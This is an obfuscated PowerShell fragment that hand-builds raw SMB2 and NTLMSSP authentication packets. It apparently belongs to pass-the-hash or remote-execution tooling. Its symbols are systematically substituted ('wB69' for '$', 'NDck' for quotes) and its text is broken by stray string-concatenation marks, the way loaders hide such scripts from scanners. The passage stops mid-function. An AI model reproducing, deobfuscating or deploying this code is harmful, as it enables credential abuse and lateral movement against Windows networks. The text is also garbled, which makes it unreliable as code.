    param([Byte[]]wB69Command,[Byte[]]wB69CreditRequest,[Bool]wB69Signing,[Int]wB69MessageID,[Byte[]]wB69ProcessID,[Byte[]]wB69TreeID,[Byte[]]wB69SessionID)


    if(wB69Signing)

    {

        wB69flags = 0x08,0x00,0x00,0x00      

    }

    else

    {

        wB69flags = 0x00,0x00,0x00,0x00

    }


    [Byte[]]wB69message_ID = [System.BitConverter]::GetBytes(wB69MessageID)


    if(wB69message_ID.Length -eq 4)

    {

        wB69message_ID += 0x00,0x00,0x00,0x00

    }


    wB69SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2Header.Add(NDckProtocolIDNDck,[Byte[]](0xfe,0x53,0x4d,0x42))

    wB69SMB2Header.Add(NDckStructureSizeNDck,[Byte[]](0x40,0x00))

    wB69SMB2Header.Add(NDckCreditChargeNDck,[Byte[]](0x01,0x00))

    wB69SMB2Header.Add(NDckChannelSequenceNDck,[Byte[]](0x00,0x00))

    wB69SMB2Header.Add(NDckReservedNDck,[Byte[]](0x00,0x00))

    wB69SMB2Header.Add(NDckCommandNDck,wB69Command)

    wB69SMB2Header.Add(NDckCreditRequestNDck,wB69CreditRequest)

    wB69SMB2Header.Add(NDckFlagsNDck,wB69flags)

    wB69SMB2Header.Add(NDckNextCommandNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2Header.Add(NDckMessageIDNDck,wB69message_ID)

    wB69SMB2Header.Add(NDckProcessIDNDck,wB69ProcessID)

    wB69SMB2Header.Add(NDckTreeIDNDck,wB69TreeID)

    wB69SMB2Header.Add(NDckSessionIDNDck,wB69SessionID)

    wB69SMB2Header.Add(NDckSignatureNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00'+',0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))


    return wB69SMB2Header

}


function New-PacketSMB2NegotiateProtocolRequest

{

    wB69SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2NegotiateProtocolRequest.Add(NDckStructureSizeNDck,[Byte[]](0x24,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckDialectCountNDck,[Byte[]](0x02,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckSecurityModeNDck,[Byte[]](0x01,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckReservedNDck,[Byte[]](0x00,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckCapabilitiesNDck,[Byte[]](0x40,0x00,0x00,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckClientGUIDNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckNegotiateContextOffsetNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckNegotiateContextCountNDck,[Byte[]](0x00,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckReserved2NDck,[Byte[]](0x00,0x00))

    wB69SMB2NegotiateProtocolRequest.Add(NDckDialectNDck,[Byte[]](0x02,0x02))

    wB69SMB2NegotiateProtocolRequest.Add(NDckDialect2NDck,[Byte[]](0x10,0x02))


    return wB69SMB2NegotiateProtocolRequest

}


function New-PacketSMB2SessionSetupRequest

{

    param([Byte[]]wB69SecurityBlob)


    [Byte[]]wB69security_buffer_length = ([System.BitConverter]::GetBytes(wB69SecurityBlob.Length))[0,1]


    wB69SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2SessionSetupRequest.Add(NDckStructureSizeNDck,[Byte[]](0x19,0x00))

    wB69SMB2SessionSetupRequest.Add(NDckFlagsNDck,[Byte[]](0x00))

    wB69SMB2SessionSetupRequest.Add(NDckSecurityModeNDck,[Byte[]](0x01))

    wB69SMB2SessionSetupRequest.Add(NDckCapabilitiesNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2SessionSetupRequest.Add(NDckChannelNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2SessionSetupRequest.Add(NDckSecurityBufferOffsetNDck,[Byte[]](0x58,0x00))

    wB69SMB2SessionSetupRequest.Add(NDckSecurityBufferLengthNDck,wB69security_buffer_length)

    wB69SMB2SessionSetupRequest.Add(NDckPreviousSessionIDNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69SMB2SessionSetupRequest.Add(NDckBufferNDck,wB69SecurityBlob)


    return wB69SMB2SessionSetupRequest 

}


function New-PacketSMB2TreeConnectRequest

{

    param([Byte[]]wB69Buffer)


    [Byte[]]wB69path_length = ([System.BitConverter]::GetBytes(wB69Buffer.Length))[0,1]


    wB69SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2TreeConnectRequest.Add(NDckStructureSizeNDck,[Byte[]](0x09,0x00))

    wB69SMB2TreeConnectRequest.Add(NDckReservedNDck,[Byte[]](0x00,0x00))

    wB69SMB2TreeConnectRequest.Add(NDckPathOffsetNDck,[Byte[]](0x48,0x00))

    wB69SMB2TreeConnectRequest.Add(NDckPathLengthNDck,wB69path_length)

    wB69SMB2TreeConnectRequest.Add(NDckBufferNDck,wB69Buffer)


    return wB69SMB2TreeConnectRequest

}


function New-PacketSMB2CreateRequest

{

    param([Byte[]]wB69FileName,[Int]wB69ExtraInfo,[Int64]wB69AllocationSize)


    if(wB69FileName)

    {

        wB69file_name_length = [System.BitConverter]::GetBytes(wB69FileName.Length)[0,1]

    }

    else

    {

        wB69FileName = 0x00,0x00,0x69,0x00,0x6e,0x00,0x64,0x00

        wB69file_name_length = 0x00,0x00

    }


    if(wB69ExtraInfo)

    {

        [Byte[]]wB69desired_access = 0x80,0x00,0x10,0x00

        [Byte[]]wB69file_attributes = 0x00,0x00,0x00,0x00

        [Byte[]]wB69share_access = 0x00,0x00,0x00,0x00

        [Byte[]]wB69create_options = 0x21,0x00,0x00,0x00

        [Byte[]]wB69create_contexts_offset = [System.BitConverter]::GetBytes(wB69FileName.Length)


        if(wB69ExtraInfo -eq 1)

        {

            [Byte[]]wB69create_contexts_length = 0x58,0x00,0x00,0x00

        }

        elseif(wB69ExtraInfo -eq 2)

        {

            [Byte[]]wB69create_contexts_length = 0x90,0x00,0x00,0x00

        }

        else

        {

            [Byte[]]wB69create_contexts_length = 0xb0,0x00,0x00,0x00

            [Byte[]]wB69allocation_size_bytes = [System.BitConverter]::GetBytes(wB69AllocationSize)

        }


        if(wB69FileName)

        {


            [String]wB69file_name_padding_check = wB69FileName.Length / 8


            if(wB69file_name_padding_check -like NDck*.75NDck)

            {

                wB69FileName += 0x04,0x00

            }

            elseif(wB69file_name_padding_check -like NDck*.5NDck)

            {

                wB69FileName += 0x00,0x00,0x00,0x00

            }

            elseif(wB69file_name_padding_check -like NDck*.25NDck)

            {

               wB69FileName += 0x00,0x00,0x00,0x00,0x00,0x00

            }


        }


        [Byte[]]wB69create_contexts_offset = [System.BitConverter]::GetBytes(wB69FileName.Length + 120)


    }

    else

    {

        [Byte[]]wB69desired_access = 0x03,0x00,0x00,0x00

        [Byte[]]wB69file_attributes = 0x80,0x00,0x00,0x00

        [Byte[]]wB69share_access = 0x01,0x00,0x00,0x00

        [Byte[]]wB69create_options = 0x40,0x00,0x00,0x00

        [Byte[]]wB69create_contexts_offset = 0x00,0x00,0x00,0x00

        [Byte[]]wB69create_contexts_length = 0x00,0x00,0x00,0x00

    }


    [String]wB69lease_key = [String](1..16 uOva ForEach-Object {NDck{0:X2}NDck -f (Get-Random -Minimum 1 -Maximum 255)})

    [Byte[]]wB69lease_key = wB69lease_key.Split(NDck NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}


    wB69SMB2CreateRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2CreateRequest.Add(NDckStructureSizeNDck,[Byte[]](0x39,0x00))

    wB69SMB2CreateRequest.Add(NDckFlagsNDck,[Byte[]](0x00))

    wB69SMB2CreateRequest.Add(NDckRequestedOplockLevelNDck,[Byte[]](0x00))

    wB69SMB2CreateRequest.Add(NDckImpersonationNDck,[Byte[]](0x02,0x00,0x00,0x00))

    wB69SMB2CreateRequest.Add(NDckSMBCreateFlagsNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69SMB2CreateRequest.Add(NDckReservedNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69SMB2CreateRequest.Add(NDckDesiredAccessNDck,wB69desired_access)

    wB69SMB2CreateRequest.Add(NDckFileAttributesNDck,wB69file_attributes)

    wB69SMB2CreateRequest.Add(NDckShareAccessNDck,wB69share_access)

    wB69SMB2CreateRequest.Add(NDckCreateDispositionNDck,[Byte[]](0x01,0x00,0x00,0x00))

    wB69SMB2CreateRequest.Add(NDckCreateOptionsNDck,wB69create_options)

    wB69SMB2CreateRequest.Add(NDckNameOffsetNDck,[Byte[]](0x78,0x00))

    wB69SMB2CreateRequest.Add(NDckNameLengthNDck,wB'+'69file_name_length)

    wB69SMB2CreateRequest.Add(NDckCreateContextsOffsetNDck,wB69create_contexts_offset)

    wB69SMB2CreateRequest.Add(NDckCreateContextsLengthNDck,wB69create_contexts_length)

    wB69SMB2CreateRequest.Add(NDckBufferNDck,wB69FileName)


    if(wB69ExtraInfo)

    {

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementDHnQ_ChainOffsetNDck,[Byte[]](0x28,0x00,0x00,0x00))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementDHnQ_Tag_OffsetNDck,[Byte[]](0x10,0x00))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementDHnQ_Tag_LengthNDck,[Byte[]](0x04,0x00,0x00,0x00))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementDHnQ_Data_OffsetNDck,[Byte[]](0x18,0x00))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementDHnQ_Data_LengthNDck,[Byte[]](0x10,0x00,0x00,0x00))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementDHnQ_TagNDck,[Byte[]](0x44,0x48,0x6e,0x51))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementDHnQ_UnknownNDck,[Byte[]](0x00,0x00,0x00,0x00))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementDHnQ_Data_GUIDHandleNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))


        if(wB69ExtraInfo -eq 3)

        {

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementAlSi_ChainOffsetNDck,[Byte[]](0x20,0x00,0x00,0x00))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementAlSi_Tag_OffsetNDck,[Byte[]](0x10,0x00))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementAlSi_Tag_LengthNDck,[Byte[]](0x04,0x00,0x00,0x00))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementAlSi_Data_OffsetNDck,[Byte[]](0x18,0x00))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementAlSi_Data_LengthNDck,[Byte[]](0x08,0x00,0x00,0x00))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementAlSi_TagNDck,[Byte[]](0x41,0x6c,0x53,0x69))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementAlSi_UnknownNDck,[Byte[]](0x00,0x00,0x00,0x00))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementAlSi_AllocationSizeNDck,wB69allocation_size_bytes)

        }


        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementMxAc_ChainOffsetNDck,[Byte[]](0x18,0x00,0x00,0x00))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementMxAc_Tag_OffsetNDck,[Byte[]](0x10,0x00))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementMxAc_Tag_LengthNDck,[Byte[]](0x04,0x00,0x00,0x00))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementMxAc_Data_OffsetNDck,[Byte[]](0x18,0x00))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementMxAc_Data_LengthNDck,[Byte[]](0x00,0x00,0x00,0x00))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementMxAc_TagNDck,[Byte[]](0x4d,0x78,0x41,0x63))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementMxAc_UnknownNDck,[Byte[]](0x00,0x00,0x00,0x00))


        if(wB69ExtraInfo -gt 1)

        {

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementQFid_ChainOffsetNDck,[Byte[]](0x18,0x00,0x00,0x00))

        }

        else

        {

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementQFid_ChainOffsetNDck,[Byte[]](0x00,0x00,0x00,0x00))

        }

        

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementQFid_Tag_OffsetNDck,[Byte[]](0x10,0x00))

        wB6'+'9SMB2CreateRequest.Add(NDckExtraInfo_ChainElementQFid_Tag_LengthNDck,[Byte[]](0x04,0x00,0x00,0x00))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementQFid_Data_OffsetNDck,[Byte[]](0x18,0x00))

'+'        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementQFid_Data_LengthNDck,[Byte[]](0x00,0x00,0x00,0x00))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementQFid_TagNDck,[Byte[]](0x51,0x46,0x69,0x64))

        wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementQFid_UnknownNDck,[Byte[]](0x00,0x00,0x00,0x00))


        if(wB69ExtraInfo -gt 1)

        {

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementRqLs_ChainOffsetNDck,[Byte[]](0x00,0x00,0x00,0x00))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementRqLs_Tag_OffsetNDck,[Byte[]](0x10,0x00))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementRqLs_Tag_LengthNDck,[Byte[]](0x04,0x00,0x00,0x00))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementRqLs_Data_OffsetNDck,[Byte[]](0x18,0x00))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementRqLs_Data_LengthNDck,[Byte[]](0x20,0x00,0x00,0x00))

            wB6'+'9SMB2CreateRequest.Add(NDckExtraInfo_ChainElementRqLs_TagNDck,[Byte[]](0x52,0x71,0x4c,0x73))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementRqLs_UnknownNDck,[Byte[]](0x00,0x00,0x00,0x00))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementRqLs_Data_Lease_KeyNDck,wB69lease_key)

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementRqLs_Data_Lease_StateNDck,[Byte[]](0x07,0x00,0x00,0x00))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementRqLs_Data_Lease_FlagsNDck,[Byte[]](0x00,0x00,0x00,0x00))

            wB69SMB2CreateRequest.Add(NDckExtraInfo_ChainElementRqLs_Data_Lease_DurationNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        }


    }


    return wB69SMB2CreateRequest

}


function New-PacketSMB2FindRequestFile

{

    param ([Byte[]]wB69FileID,[Byte[]]wB69Padding)


    wB69SMB2FindRequestFile = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2FindRequestFile.Add(NDckSMB2FindRequestFile_StructureSizeNDck,[Byte[]](0x21,0x00))

    wB69SMB2FindRequestFile.Add(NDckSMB2FindRequestFile_InfoLevelNDck,[Byte[]](0x25))

    wB69SMB2FindRequestFile.Add(NDckSMB2FindRequestFile_FlagsNDck,[Byte[]](0x00))

    wB69SMB2FindRequestFile.Add(NDckSMB2FindRequestFile_FileIndexNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2FindRequestFile.Add(NDckSMB2FindRequestFile_FileIDNDck,wB69FileID)

    wB69SMB2FindRequestFile.Add(NDckSMB2FindRequestFile_SearchPattern_OffsetNDck,[Byte[]](0x60,0x00))

    wB69SMB2FindRequestFile.Add(NDckSMB2FindRequestFile_SearchPattern_LengthNDck,[Byte[]](0x02,0x00))

    wB69SMB2FindRequestFile.Add('+'NDckSMB2FindRequestFile_OutputBufferLengthNDck,[Byte[]](0x00,0x00,0x01,0x00))

    wB69SMB2FindRequestFile.Add(NDckSMB2FindRequestFile_SearchPatternNDck,[Byte[]](0x2a,0x00))


    if(wB69padding)

    {

        wB69SMB2FindRequestFile.Add(NDckSMB2FindRequestFile_PaddingNDck,wB69Padding)

    }


    return wB69SMB2FindRequestFile

}


function New-PacketSMB2QueryInfoRequest

{

    param ([Byte[]]wB69InfoType,[Byte[]]wB69FileInfoClass,[Byte[]]wB69OutputBufferLength,[Byte[]]wB69InputBufferOffs'+'et,[Byte[]]wB69FileID,[Int]wB69Buffer)


    [Byte[]]wB69buffer_bytes = ,0x00 * wB69Buffer


    wB69SMB2QueryInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2QueryInfoRequest.Add(NDckStructureSizeNDck,[Byte[]](0x29,0x00))

    wB69SMB2QueryInfoRequest.Add(NDckInfoTypeNDck,wB69InfoType)

    wB69SMB2QueryInfoRequest.Add(NDckFileInfoClassNDck,wB69FileInfoClass)

    wB69SMB2QueryInfoRequest.Add(NDckOutputBufferLengthNDck,wB69OutputBufferLength)

    wB69SMB2QueryInfoRequest.Add(NDckInputBufferOffsetNDck,wB69InputBufferOffset)

    wB69SMB2QueryInfoRequest.Add(NDckReservedNDck,[Byte[]](0x00,0x00))

    wB69SMB2QueryInfoRequest.Add(NDckInputBufferLengthNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2QueryInfoRequest.Add(NDckAdditionalInformationNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2QueryInfoRequest.Add(NDckFlagsNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2QueryInfoRequest.Add(NDckFileIDNDck,wB69FileID)


    if(wB69Buffer -gt 0)

    {

        wB69SMB2QueryInfoRequest.Add(NDckBufferNDck,wB69buffer_bytes)

    }


    return wB69SMB2QueryInfoRequest

}


function New-PacketSMB2ReadRequest

{

    param ([Int]wB69Length,[Int64]wB69Offset,[Byte[]]wB69FileID)


    [Byte[]]wB69length_bytes = [System.BitConverter]::GetBytes(wB69Length)

    [Byte[]]wB69offset_bytes = [System.BitConverter]::GetBytes(wB69Offset)


    wB69SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2ReadRequest.Add(NDckStructureSizeNDck,[Byte[]](0x31,0x00))

    wB69SMB2ReadRequest.Add(NDckPaddingNDck,[Byte[]](0x50))

    wB69SMB2ReadRequest.Add(NDckFlagsNDck,[Byte[]](0x00))

    wB69SMB2ReadRequest.Add(NDckLengthNDck,wB69length_bytes)

    wB69SMB2ReadRequest.Add(NDckOffsetNDck,wB69offset_bytes)

    wB69SMB2ReadRequest.Add(NDckFileIDNDck,wB69FileID)

    wB69SMB2ReadRequest.Add(NDckMinimumCountNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2ReadRequest.Add(NDckChannelNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2ReadRequest.Add(NDckRemainingBytesNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2ReadRequest.Add(NDckReadChannelInfoOffsetNDck,[Byte[]](0x00,0x00))

    wB69SMB2ReadRequest.Add(NDckReadChannelInfoLengthNDck,[Byte[]](0x00,0x00))

    wB69SMB2ReadRequest.Add(NDckBufferNDck,[Byte[]](0x30))


    return wB69SMB2ReadRequest

}


function New-PacketSMB2WriteRequest

{

    param([Int]wB69Length,[Int64]wB69Offset,[Byte[]]wB69FileID,[Byte[]]wB69Buffer)


    [Byte[]]wB69length_bytes = [System.BitConverter]::GetBytes(wB69Length)

    [Byte[]]wB69offset_bytes = [System.BitConverter]::GetBytes(wB69Offset)


    wB69SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2WriteRequest.Add(NDckStructureSizeNDck,[Byte[]](0x31,0x00))

    wB69SMB2WriteRequest.Add(NDckDataOffsetNDck,[Byte[]](0x70,0x00))

    wB69SMB2WriteRequest.Add(NDckLengthNDck,wB69length_bytes)

    wB69SMB2WriteRequest.Add(NDckOffsetNDck,wB69offset_bytes)

    wB69SMB2WriteRequest.Add(NDckFileIDNDck,wB69FileID)

    wB69SMB2WriteRequest.Add(NDckChannelND'+'ck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2WriteRequest.Add(NDckRemainingBytesNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2WriteRequest.Add(NDckWriteChannelInfoOffsetNDck,[Byte[]](0x00,0x00))

    wB69SMB2WriteRequest.Add(NDckWriteChannelInfoLengthNDck,[Byte[]](0x00,0x00))

    wB69SMB2WriteRequest.Add(NDckFlagsNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2WriteRequest.Add(NDckSMB2WriteRequest_BufferNDck,wB69Buffer)


    return wB69SMB2WriteRequest

}


function New-PacketSMB2CloseRequest

{

    param ([Byte[]]wB69FileID)


    wB69SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2CloseRequest.Add(NDckStructureSizeNDck,[Byte[]](0x18,0x00))

    wB69SMB2CloseRequest.Add(NDckFlagsNDck,[Byte[]](0x00,0x00))

    wB69SMB2CloseRequest.Add(NDckReservedNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2CloseRequest.Add(NDckFileIDNDck,wB69FileID)


    return wB69SMB2CloseRequest

}


function New-PacketSMB2TreeDisconnectRequest

{

    wB69SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2TreeDisconnectRequest.Add(NDckStructureSizeNDck,[Byte[]](0x04,0x00))

    wB69SMB2TreeDisconnectRequest.Add(NDckReservedNDck,[Byte[]](0x00,0x00))


    return wB69SMB2TreeDisconnectRequest

}


function New-PacketSMB2SessionLogoffRequest

{

    wB69SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2SessionLogoffRequest.Add(NDckStructureSizeNDck,[Byte[]](0x04,0x00))

    wB69SMB2SessionLogoffRequest.Add(NDckReservedNDck,[Byte[]](0x00,0x00))


    return wB69SMB2SessionLogoffRequest

}


function New-PacketSMB2IoctlRequest()

{

    param([Byte[]]wB69FileName)


    wB69file_name_length = [System.BitConverter]::GetBytes(wB69FileName.Length + 2)


    wB69packet_SMB2IoctlRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69packet_SMB2IoctlRequest.Add(NDckStructureSizeNDck,[Byte[]](0x39,0x00))

    wB69packet_SMB2IoctlRequest.Add(NDckReservedNDck,[Byte[]](0x00,0x00))

    wB69packet_SMB2IoctlRequest.Add(NDckFunctionNDck,[Byte[]](0x94,0x01,0x06,0x00))

    wB69packet_SMB2IoctlRequest.Add(NDckGUIDHandleNDck,[Byte[]](0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff))

    wB69packet_SMB2IoctlRequest.Add(NDckInData_OffsetNDck,[Byte[]](0x78,0x00,0x00,0x00))

    wB69packet_SMB2IoctlRequest.Add(NDckInData_LengthNDck,wB69file_name_length)

    wB69packet_SMB2IoctlRequest.Add(NDckMaxIoctlInSizeNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69packet_SMB2IoctlRequest.Add(NDckOutData_OffsetNDck,[Byte[]](0x78,0x00,0x00,0x00))

    wB69packet_SMB2IoctlRequest.Add(NDckOutData_LengthNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69packet_SMB2IoctlRequest.Add(NDckMaxIoctlOutSizeNDck,[Byte[]](0x00,0x10,0x00,0x00))

    wB69packet_SMB2IoctlRequest.Add(NDckFlagsNDck,[Byte[]](0x01,0x00,0x00,0x00))

    wB69packet_SMB2IoctlRequest.Add(NDckUnknownNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69packet_SMB2IoctlRequest.Add(NDckInData_MaxReferralLevelNDck,[Byte[]](0x04,0x00))

    wB69packet_SMB2IoctlRequest.Add(NDckInData_FileNameNDck,wB69FileName)


    return wB69packet_SMB2IoctlRequest

}


function New-PacketSMB2SetInfoRequest

{

    param ([Byte[]]wB69InfoType,[Byte[]]wB69FileInfoClass,[Byte[]]wB69FileID,[Byte[]]wB69Buffer)


    [Byte[]]wB69buffer_length = [System.BitConverter]::GetBytes(wB69Buffer.Count)


    wB69SMB2SetInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMB2SetInfoRequest.Add(NDckStructureSizeNDck,[Byte[]](0x21,0x00))

    wB69SMB2SetInfoRequest.Add(NDckInfoTypeNDck,wB69InfoType)

    wB69SMB2SetInfoRequest.Add(NDckFileInfoClassNDck,wB69FileInfoClass)

    wB69SMB2SetInfoRequest.Add(NDckBufferLengthNDck,wB69buffer_length)

    wB69SMB2SetInfoRequest.Add(NDckBufferOffsetNDck,[Byte[]](0x60,0x00))

    wB69SMB2SetInfoRequest.Add(NDckReservedNDck,[Byte[]](0x00,0x00))

    wB69SMB2SetInfoRequest.Add(NDckAdditionalInformationNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMB2SetInfoRequest.Add(NDckFileIDNDck,wB69FileID)

    wB69SMB2SetInfoRequest.Add(NDckBufferNDck,wB69Buffer)


    return wB69SMB2SetInfoRequest

}


#NTLM


function New-PacketNTLMSSPNegotiate

{

    param([Byte[]]wB69NegotiateFlags,[Byte[]]wB69Version)


    [Byte[]]wB69NTLMSSP_length = ([System.BitConverter]::GetBytes(wB69Version.Length + 32))[0]

    [Byte[]]wB69ASN_length_1 = wB69NTLMSSP_length[0] + 32

    [Byte[]]wB69ASN_length_2 = wB69NTLMSSP_length[0] + 22

    [Byte[]]wB69ASN_length_3 = wB69NTLMSSP_length[0] + 20

    [Byte[]]wB69ASN_length_4 = wB69NTLMSSP_length[0] + 2


    wB69NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary

    wB69NTLMSSPNegotiate.Add(NDckInitialContextTokenIDNDck,[Byte[]](0x60))

    wB69NTLMSSPNegotiate.Add(NDckInitialcontextTokenLengthNDck,wB69ASN_length_1)

    wB69NTLMSSPNegotiate.Add(NDckThisMechIDNDck,[Byte[]](0x06))

    wB69NTLMSSPNegotiate.Add(NDckThisMechLengthNDck,[Byte[]](0x06))

    wB69NTLMSSPNegotiate.Add(NDckOIDNDck,[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))

    wB69NTLMSSPNegotiate.Add(NDckInnerContextTokenIDNDck,[Byte[]](0xa0))

    wB69NTLMSSPNegotiate.Add(NDckInnerContextTokenLengthNDck,wB69ASN_length_2)

    wB69NTLMSSPNegotiate.Add(NDckInnerContextTokenID2NDck,[Byte[]](0x30))

    wB69NTLMSSPNegotiate.Add(NDckInnerContextTokenLength2NDck,wB69ASN_length_3)

    wB69NTLMSSPNegotiate.Add(NDckMechTypesIDNDck,[Byte[]](0xa0))

    wB69NTLMSSPNegotiate.Add(NDckMechTypesLengthNDck,[Byte[]](0x0e))

    wB69NTLMSSPNegotiate.Add(NDckMechTypesID2NDck,[Byte[]](0x30))

    wB69NTLMSSPNegotiate.Add(NDckMechTypesLength2NDck,[Byte[]](0x0c))

    wB69NTLMSSPNegotiate.Add(NDckMechTypesID3NDck,[Byte[]](0x06))

    wB69NTLMSSPNegotiate.Add(NDckMechTypesLength3NDck,[Byte[]](0x0a))

    wB69NTLMSSPNegotiate.Add(NDckMechTypeNDck,[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))

    wB69NTLMSSPNegotiate.Add(NDckMechTokenIDNDck,[Byte[]](0xa2))

    wB69NTLMSSPNegotiate.Add(NDckMechTokenLengthNDck,wB69ASN_length_4)

    wB69NTLMSSPNegotiate.Add(NDckNTLMSSPIDNDck,[Byte[]](0x04))

    wB69NTLMSSPNegotiate.Add(NDckNTLMSSPLengthNDck,wB69NTLMSSP_length)

    wB69NTLMSSPNegotiate.Add(NDckIdentifierNDck,[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))

    wB69NTLMSSPNegotiate.Add(NDckMessageTypeNDck,[B'+'yte[]](0x01,0x00,0x00,0x00))

    wB69NTLMSSPNegotiate.Add(NDckNegotiateFlagsNDck,wB69NegotiateFlags)

    wB69NTLMSSPNegotiate.Add(NDckCallingWorkstationDomainNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69NTLMSSPNegotiate.Add(NDckCallingWorkstationNameNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))


    if(wB69Version)

    {

        wB69NTLMSSPNegotiate.Add(NDckVersionNDck,wB69Version)

    }


    return wB69NTLMSSPNegotiate

}


function New-PacketNTLMSSPAuth

{

    param([Byte[]]wB69NTLMResponse)


    [Byte[]]wB69NTLMSSP_length = ([System.BitConverter]::GetBytes(wB69NTLMResponse.Length))[1,0]

